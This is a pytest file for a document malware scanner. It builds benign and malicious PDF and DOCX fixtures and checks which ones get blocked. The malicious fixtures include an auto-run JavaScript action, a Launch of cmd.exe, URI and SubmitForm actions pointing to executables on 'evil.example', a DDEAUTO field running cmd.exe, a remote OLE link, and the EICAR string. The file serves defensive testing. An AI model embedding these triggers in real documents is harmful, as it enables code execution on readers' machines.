"""Precision tests for document_service: benign PDFs with plain /OpenAction,
look-alike names and big structures must pass, while real active content
(JS / Launch / SubmitForm / URI to executable / embedded executables) is kept.
"""

from __future__ import annotations

import asyncio
import io
import os
import sys
import zipfile

import pytest

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

fitz = pytest.importorskip("fitz")
pytest.importorskip("yara")

from document_service import content_model, main as dmain, malware_model, metadata_model, structure_model  # noqa: E402


@pytest.fixture(scope="module", autouse=True)
def _warm():
    structure_model.load_model()
    malware_model.load_rules()
    content_model.load_model()


REAL_PE = b"MZ\x90\x00" + b"\x00" * 56 + b"\x40\x00\x00\x00" + b"PE\x00\x00" + b"\x41" * 300  # e_lfanew=0x40


def verdict(data: bytes):
    rs = [
        structure_model.analyze(data),
        content_model.analyze(data),
        asyncio.run(malware_model.analyze(data)),
        metadata_model.analyze(data),
    ]
    return dmain._aggregate(rs), {r.module: r for r in rs}


def blocked(data: bytes) -> bool:
    v, _ = verdict(data)
    return str(getattr(v.status, "value", v.status)).lower() == "block"


def pdf(catalog_extra: str = "", objs: str = "", pages: int = 1) -> bytes:
    doc = fitz.open()
    for _ in range(pages):
        doc.new_page()
    cat = doc.pdf_catalog()
    if catalog_extra:
        for k, v in [kv.split(" ", 1) for kv in catalog_extra.split(";")]:
            doc.xref_set_key(cat, k, v)
    for body in [o for o in objs.split("|||") if o]:
        x = doc.get_new_xref()
        doc.update_object(x, body)
    out = doc.tobytes()
    doc.close()
    return out


def raw_pdf(catalog_extra: str, objs: str = "") -> bytes:
    s = f"%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R {catalog_extra} >>\nendobj\n"
    s += "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
    s += "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] >>\nendobj\n" + objs
    s += "trailer\n<< /Root 1 0 R /Size 20 >>\n%%EOF\n"
    return s.encode("latin-1")


# ----------------------------------------------------------------- benign


def test_plain_openaction_goto_is_not_flagged():
    data = raw_pdf("/OpenAction [3 0 R /Fit]")
    v, m = verdict(data)
    assert not blocked(data), v
    assert m["structure"].score < 0.5, m["structure"]
    assert m["malware"].score == 0.0


def test_indirect_openaction_goto_is_not_flagged():
    data = raw_pdf("/OpenAction 4 0 R", "4 0 obj\n<< /S /GoTo /D [3 0 R /XYZ 0 0 1] >>\nendobj\n")
    assert not blocked(data)
    assert structure_model.analyze(data).score < 0.5


def test_js_prefixed_names_do_not_match_yara():
    # /JSONData, /JSInfo etc. start with /JS but are not the JavaScript key.
    data = raw_pdf("/OpenAction [3 0 R /Fit] /JSInfo 5 0 R", "5 0 obj\n<< /JSONData (x) >>\nendobj\n")
    assert asyncio.run(malware_model.analyze(data)).score == 0.0
    assert structure_model.analyze(data).score < 0.5


def test_form_with_openaction_is_not_flagged():
    data = raw_pdf("/OpenAction [3 0 R /Fit] /AcroForm << /Fields [] >>")
    assert not blocked(data)


def test_embedded_plain_text_attachment_not_flagged_even_with_MZ_bytes():
    doc = fitz.open()
    doc.new_page()
    doc.embfile_add("notes.txt", b"hello MZ world " * 20)
    data = doc.tobytes(deflate=False)
    doc.close()
    assert not blocked(data)
    assert asyncio.run(malware_model.analyze(data)).score == 0.0


def test_large_pdf_structure_not_anomalous():
    data = pdf(pages=150)
    r = structure_model.analyze(data)
    assert r.score < 0.5, r


def test_docx_with_external_hyperlinks_not_flagged():
    b = io.BytesIO()
    with zipfile.ZipFile(b, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml", "<w:document xmlns:w='x'/>")
        rels = "".join(f'<Relationship Id="r{i}" Target="http://example.org/{i}" TargetMode="External"/>' for i in range(30))
        z.writestr("word/_rels/document.xml.rels", f"<Relationships>{rels}</Relationships>")
    assert not blocked(b.getvalue())


# ------------------------------------------------------------- malicious


def test_openaction_javascript_still_blocked():
    data = raw_pdf("/OpenAction 4 0 R", "4 0 obj\n<< /S /JavaScript /JS (app.alert(1);) >>\nendobj\n")
    assert blocked(data)
    assert structure_model.analyze(data).score >= 0.7


def test_inline_openaction_javascript_still_blocked():
    data = raw_pdf("/OpenAction << /S /JavaScript /JS (app.alert(1);) >>")
    assert blocked(data)


def test_openaction_launch_still_blocked():
    data = raw_pdf("/OpenAction 4 0 R", "4 0 obj\n<< /S /Launch /F (cmd.exe) >>\nendobj\n")
    assert blocked(data)
    assert structure_model.analyze(data).score >= 0.7


def test_openaction_uri_to_executable_is_hard_flagged():
    data = raw_pdf("/OpenAction << /S /URI /URI (http://evil.example/payload.exe) >>")
    assert structure_model.analyze(data).score >= 0.7


def test_openaction_plain_uri_is_not_hard_flagged():
    data = raw_pdf("/OpenAction << /S /URI /URI (http://example.org/index.html) >>")
    assert structure_model.analyze(data).score < 0.5


def test_openaction_submitform_to_executable_is_hard_flagged():
    data = raw_pdf("/OpenAction << /S /SubmitForm /F (http://evil.example/drop.exe) >>")
    assert structure_model.analyze(data).score >= 0.7


def test_embedded_pe_attachment_flagged_even_when_compressed():
    pe = REAL_PE
    doc = fitz.open()
    doc.new_page()
    doc.embfile_add("update.exe", pe)
    data = doc.tobytes(deflate=True)
    doc.close()
    assert blocked(data)


def test_embedded_pe_raw_bytes_yara():
    pe = REAL_PE
    raw = raw_pdf("/Names << /EmbeddedFiles << /Names [(a.exe) 4 0 R] >> >>",
                  "4 0 obj\n<< /Type /EmbeddedFile /Length 100 >>\nstream\n" + pe.decode("latin-1") + "\nendstream\nendobj\n")
    assert asyncio.run(malware_model.analyze(raw)).score >= 0.9


def test_eicar_in_stored_zip_still_matches():
    eicar = b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    b = io.BytesIO()
    with zipfile.ZipFile(b, "w", zipfile.ZIP_STORED) as z:
        z.writestr("eicar.com", eicar)
    assert asyncio.run(malware_model.analyze(b.getvalue())).score >= 0.9


def test_vba_project_docx_still_blocked():
    b = io.BytesIO()
    with zipfile.ZipFile(b, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("word/document.xml", "<x/>")
        z.writestr("word/vbaProject.bin", b"\xd0\xcf\x11\xe0" + b"\x00" * 100)
    assert blocked(b.getvalue())


def test_cve_2017_11882_marker_still_matches():
    data = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 64 + b"Equation Native" + b"\x00" * 32
    assert asyncio.run(malware_model.analyze(data)).score >= 0.9


def _docx(files: dict) -> bytes:
    b = io.BytesIO()
    with zipfile.ZipFile(b, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        for k, v in files.items():
            z.writestr(k, v)
    return b.getvalue()


def test_docx_dde_field_flagged():
    data = _docx({"word/document.xml": '<w:document xmlns:w="x"><w:r><w:instrText xml:space="preserve"> DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc" </w:instrText></w:r></w:document>'})
    assert structure_model.analyze(data).score >= 0.85
    assert blocked(data)


def test_docx_text_mentioning_dde_not_flagged():
    data = _docx({"word/document.xml": "<w:document xmlns:w='x'><w:t>The DDE protocol is legacy</w:t></w:document>"})
    assert not blocked(data)


def test_docx_remote_linked_ole_flagged():
    rels = '<Relationships><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="http://evil.example/x.doc" TargetMode="External"/></Relationships>'
    data = _docx({"word/document.xml": "<w:document xmlns:w='x'/>", "word/_rels/document.xml.rels": rels})
    assert blocked(data)


def test_pdf_with_leading_junk_before_header_still_detected():
    data = b"% some banner\r\n\r\n" + raw_pdf("/OpenAction 4 0 R", "4 0 obj\n<< /S /JavaScript /JS (app.alert(1);) >>\nendobj\n")
    assert blocked(data)


def test_acrobat_form_format_helpers_not_flagged():
    objs = ("4 0 obj\n<< /AA << /F 5 0 R >> >>\nendobj\n"
            "5 0 obj\n<< /S /JavaScript /JS (AFNumber_Format\\(2, 0, 0, 0, \"\", true\\);) >>\nendobj\n")
    data = raw_pdf("/AcroForm << /Fields [4 0 R] >>", objs)
    assert not blocked(data)


def test_widget_level_js_in_form_not_auto_run_blocked():
    # Field-level /AA scripts (validation, calculation) run on user interaction.
    objs = ("4 0 obj\n<< /FT /Tx /T (a) /AA << /K 5 0 R >> >>\nendobj\n"
            "5 0 obj\n<< /S /JavaScript /JS (event.rc = !isNaN(event.value);) >>\nendobj\n")
    data = raw_pdf("/AcroForm << /Fields [4 0 R] >>", objs)
    assert not blocked(data)


def test_catalog_level_aa_javascript_blocked_even_with_acroform():
    objs = "4 0 obj\n<< /S /JavaScript /JS (app.alert(1);) >>\nendobj\n"
    data = raw_pdf("/AcroForm << /Fields [] >> /AA << /WC 4 0 R >>", objs)
    assert blocked(data)


def test_names_tree_javascript_blocked():
    objs = "4 0 obj\n<< /S /JavaScript /JS (app.alert(1);) >>\nendobj\n"
    data = raw_pdf("/Names << /JavaScript << /Names [(a) 4 0 R] >> >>", objs)
    assert blocked(data)


def test_metadata_path_leak_alone_never_blocks():
    doc = fitz.open()
    doc.new_page()
    doc.set_metadata({"title": "/Users/alice/a/ /Users/alice/b/ /Users/alice/c/ /home/bob/x/ C:\\Users\\carol\\x", "author": "q"})
    data = doc.tobytes()
    doc.close()
    assert not blocked(data)


# ------------------------------------------------ coincidental stream bytes


def _pdf_with_stream(catalog_extra: str, stream: bytes, dict_extra: str = "") -> bytes:
    head = f"%PDF-1.7\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R {catalog_extra} >>\nendobj\n"
    head += "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
    head += "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] >>\nendobj\n"
    head += f"5 0 obj\n<< /Length {len(stream)} {dict_extra} >>\nstream\n"
    return head.encode("latin-1") + stream + b"\nendstream\nendobj\ntrailer\n<< /Root 1 0 R /Size 20 >>\n%%EOF\n"


def test_coincidental_js_aa_bytes_inside_stream_with_plain_openaction_not_blocked():
    import random

    rng = random.Random(7)
    noise = bytes(rng.randrange(256) for _ in range(200_000))
    stream = noise + b"\xe4/JS\xe2\xb9" + noise[:5000] + b"\x91/AA\x04\x92" + b"/JavaScript\x01/Launch\x02"
    data = _pdf_with_stream("/OpenAction [3 0 R /Fit]", stream)
    v, m = verdict(data)
    assert not blocked(data), v
    assert m["malware"].score == 0.0


def test_true_positive_twin_js_action_wired_to_openaction_still_blocked():
    data = _pdf_with_stream("/OpenAction 4 0 R", b"\x00\x01\x02" * 1000) + b""
    data = data.replace(b"trailer", b"4 0 obj\n<< /S /JavaScript /JS (app.alert(1)) >>\nendobj\ntrailer", 1)
    assert blocked(data)
    assert asyncio.run(malware_model.analyze(data)).score >= 0.9


def test_random_stream_bytes_never_trigger_any_byte_level_rule():
    import random

    rng = random.Random(1234)
    frags = [b"MZ", b"PE\x00\x00", b"\x7fELF", b"\x7fELF\x02\x01", b"/JS", b"/AA", b"/Launch",
             b"/OpenAction", b"/JavaScript", b"X5O!P%@AP", b"This program"]
    for _ in range(2000):
        n = rng.randrange(256, 6000)
        buf = bytearray(rng.randrange(256) for _ in range(n))
        for _ in range(rng.randrange(0, 8)):
            f = rng.choice(frags)
            i = rng.randrange(0, n)
            buf[i:i + len(f)] = f
        data = _pdf_with_stream("/OpenAction [3 0 R /Fit]", bytes(buf), "/Type /EmbeddedFile /Filter /FlateDecode")
        r = asyncio.run(malware_model.analyze(data))
        assert r.score == 0.0, (r.findings, bytes(buf)[:80])
